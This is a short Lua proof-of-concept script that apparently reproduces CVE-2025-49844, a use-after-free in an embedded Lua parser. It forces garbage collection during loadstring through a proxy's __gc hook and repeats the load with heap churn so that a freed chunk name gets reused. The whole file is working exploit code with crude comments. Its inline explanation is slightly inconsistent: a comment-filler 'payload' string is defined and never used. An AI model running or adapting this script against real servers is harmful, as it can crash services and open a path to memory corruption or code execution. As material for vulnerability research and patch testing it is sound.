-- CVE-2025-49844 repro: leverage GC during parsing to revive freed chunk name.
-- Keep the chunk large enough to hold onto GC-managed memory but avoid the
-- "200 local variables" compilation guard by filling it with comments.
local payload = string.rep('-- whatthefuuuuuuuuuuuuuuck\n', 4096)

local function build_payload()
	local lines = {}
	for i = 1, 150 do
		lines[i] = string.format('local v_%d = %d', i, i)
	end
	lines[#lines + 1] = 'return 0'
	return table.concat(lines, '\n')
end

local function make_chunk_name()
	local p = newproxy(true)
	getmetatable(p).__gc = function()
		-- Re-enter the collector while luaY_parser still holds the name string
		collectgarbage('collect')
	end
	return tostring(p)
end

local source = build_payload()

for i = 1, 2000 do
	local fn, err = loadstring(source, make_chunk_name())
	if not fn then
		return { step = i, err = err }
	end
	if i % 64 == 0 then
		-- Heap churn to encourage the collector to run during parsing
		local junk = {}
		for j = 1, 256 do
			junk[j] = string.rep('A', 4096)
		end
	end
end

return "completed w/o immediate crash (sybau & re-run to increase likelihood)"